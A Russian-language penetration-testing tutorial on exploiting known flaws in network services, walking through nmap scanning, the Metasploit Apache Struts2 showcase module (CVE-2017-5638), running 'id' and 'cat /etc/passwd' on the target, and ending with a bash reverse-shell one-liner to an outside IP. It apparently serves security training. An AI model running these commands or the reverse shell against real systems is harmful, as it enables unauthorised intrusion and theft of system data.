
Основные понятия

Эксплоит (англ. exploit, эксплуатировать) — компьютерная программа, фрагмент программного кода или последовательность команд, использующие уязвимости в программном обеспечении и применяемые для проведения атаки на вычислительную систему. 

Нагрузка (англ. payload, Поле́зная нагру́зка) — часть эксплойта, которая производит деструктивные действия с данными, копирование информации с компьютера и т.д.

Фреймворк эксплуатации — платформа для создания и отладки эксплойтов. Кроме того, включает в себя базу опкодов, архив шеллкодов и информацию по исследованиям информационной безопасности.

Уязвимость нулевого дня — термин, обозначающий неустранённые уязвимости, а также вредоносные программы, против которых ещё не разработаны защитные механизмы.

Шеллкод (англ. shellcode, код запуска оболочки) — это двоичный исполняемый код, который обычно передаёт управление командному процессору, например '/bin/sh' в Unix shell, 'command.com' в MS-DOS и 'cmd.exe' в операционных системах Microsoft Windows. Шелл-код может быть использован как полезная нагрузка эксплойта, обеспечивающая взломщику доступ к командной оболочке (англ. shell) в компьютерной системе.

Опкод (англ. opcode от operation code — код операции) — это специальный код, который представляет операцию или команду, выполняемую процессором компьютера. Он является непосредственной инструкцией для выполнения определенного действия, такого как сложение, умножение, сравнение и т.д.


Наше положение в сети

На этом этапе мы анализируем сетевые сервисы, отличные от веб-приложений. Типовые проблемы сетевых сервисов:

    Проблемы конфигурации
    Слабые пароли
    Неиспользование шифрования
    Известные уязвимости

Известные уязвимости — уязвимости, которые присущи конкретному ПО и существуют в определенных версиях этого ПО.
6_1_1_net.png



Разбор базового примера
Уязвимость, которая может быть найдена в публичном сетевом сервисе заказчика

Ход действий

1. Проведем сканирование узла evil.corp, используя Nmap: отключим ping-сканирование с помощью опции -Pn, выведем только открытые порты с помощью опции --open и определим версии сервисом с помощью опции -sV:


$ nmap -sT -Pn -p 21,22,23,80,445 -sV --open -v evil.corp

2. Видим в выводе порт 8080 с http-сервисом. Откроем его в браузере.

3. Изучим это приложение, определим, что это Struts 2 с стандартной страницей showcase, демонстрирующей возможности этого фреймворка. Попытаемся найти известные уязвимости для этого сервиса с помощью Metasploit Framework:

$ msfconsole

msf6> search apache struts2 showcase

4. Воспользуемся эксплойтом:

msf6> exploit/multi/http/struts2_code_exec_showcase

5. Изучим эксплойт и его настройки:

msf6> info

msf6> options

7. Настроим эксплойт:

msf6> set RHOSTS evil.corp

8. С помощью браузера подберем значение для опции TARGETURI; так как стандартный путь не работает – проверим TARGETURI /integration/saveGangster.action и убедимся, что он работает:

msf6> set TARGETURI /integration/saveGangster.action

9. Подготовим полезную нагрузку для выполнения произвольных команд:

msf6> set PAYLOAD cmd/unix/generic

msf6> set CMD id

10. Запустим эксплойт и убедимся, что у нас есть права root:

msf6> run

11. Поменяем команду:

msf6> set CMD cat /etc/passwd

msf6> run



Общие принципы

Рассмотрим все этапы базового примера по отдельности:

    Обнаружение цели
    Исследование цели
    Поиск уязвимостей
    Подбор эксплойта
    Эксплуатация уязвимости

Этап 1. Обнаружение

Для начала нужно понимать что он находится на каком-то из открытых портов сервера и вам важно научиться искать такие порты и сервисы.

Для понимания механизма сканирование открытых портов и сервисов на них, необходимо разобраться с работой сетевых протоколов отвечающих за работу с данными «абстрактными понятиями».

Уже сейчас вы научитесь пользоваться сканерами сети, и сможете достигать некоторых результатов, но для действительного обладания знанием и пониманием происходящего вам предстоит самостоятельно изучить протоколы, лежащие в основе сетевого взаимодействия сегодня: TCP, UDP, IP, ICMP.

    Сканеры сети, позволяют отвечать на вопросы: какие сервисы опубликованы на узле? какие сетевые порты они используют? доступен ли узел для нас?

Популярные примеры сканеров:

    nmap — один из самых популярных сканеров сети
    Zenmap — GUI для nmap
    Masscan — сканер сети разработанный с целью увеличения скорости сканирование крупных сегментов сети, в т.ч. всего пространства адресов IPv4.

Рассмотрим наш пример:

nmap -F -Pn -sT -sV -v localhost

Этап 2. Исследование сервиса

На этом этапе наши главные задачи:

    Выявить программное обеспечение и его точную версию
    Обнаружить особенности настройки сервиса (демо режим \ стандартные настройки \ используемые патчи)
    Изучить прочие детали состояния сервиса и возможные данные, имеющиеся у нас, связанные с ним.

Возможными проблемами на этом этапе может быть отсутствие явной информации о версии ПО, в таком случае могут помочь различные трюки:

    Подсчет контрольных сумм статичных файлов, для сравнения их с файлами определенной версии (favicon, js код, изображения)
    Исследование изменений в коде и изучение патчей, которые видны из кода веб страниц, сравнение их с версиями кода в репозиториях
    Поиск функций отладки или специальных страниц, раскрывающих информацию о ПО

В нашем примере:

Apache Struts Showcase

Этап 3. Поиск известных уязвимостей для данной версии ПО

На данном этапе мы используем базы знаний и инструменты позволяющие нам определить наличие уязвимостей в исследуемом ПО

Для этих целей отлично подходят следующие инструменты:

    База знаний Common Vulnerabilities and Exposures - https://cve.mitre.org/
    Платформа Vulners - https://vulners.com/
    База данных эксплойтов от Offensive Security - https://www.exploit-db.com/
    Платформа управления уязвимостями и анализа угроз - https://vuldb.com/

В любом случае, умение поиска уязвимостей для ПО не ограничивается конкретными инструментами, а только фантазией ищущего. В поиске уязвимостей вам могут также помочь прочие инструменты: Поисковые движки (google.com), Публичные репозитории (github.com), Блоги разработчиков ПО, Китайский сегмент интернета, и пр.

В нашем примере:

msfconsole search ‘Apache Struts Showcase’

Этап 4. Подбор эксплоита для конкретной уязвимости

    Важно понимать: далеко не всегда, узнав об уязвимости, мы будем получать эксплойт к ней.
    Проблема в том, что для большинства уязвимостей эксплойты так и не становятся известны.

Доступны два сценария:

  1. Мы узнали о наличии уязвимости в ПО и его определенной версии, и для него есть эксплоит, который можно найти в сети.

В таком случае нам остается:

        найти эксплоит,
        разобраться в принципах его работы,
        изучить код эксплойта, прежде чем запускать его,
        донастроить\дописать эксплоит под свою задачу
        отладить его на своем локальном стенде
        применить эксплоит

    2. Мы узнали о наличии уязвимости в ПО и его определенной версии, и для него нет публичного эксплойта.

В таком случае вариантов не много:

        узнать можно ли где-то приобрести данный эксплоит
        исследовать ПО и его определенную версию с целью обнаружить уязвимость и подготовить эксплоит самостоятельно.

В нашем примере:

Уязвимость: Apache Struts2 CVE-2017–5638

Эксплоит: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_code_exec_showcase.rb

Детальный разбор эксплойта: https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede

Этап 5. Эксплуатация уязвимости

Предполагается что до этапа эксплуатации у вас есть отлаженные, подготовленный эксплоит для вашей версии ПО и вы можете его применить.

Убедитесь что:

    вы знаете что будет делать эксплоит, как и почему это сработает;
    эксплоит не нарушит работоспособности системы и не изменит ее состояние существенно;
    эксплоит не содержит закладок и “логических бомб”, которые могут быть спрятаны туда злоумышленником;
    после выполнения эксплойта вам не придется применять его второй раз (подготовьтесь к закреплению доступа, убедитесь что вы решаете задачу за наименьшее число шагов)

В нашем примере:

sh -i >& /dev/tcp/192.168.0.177/9001 0>&1
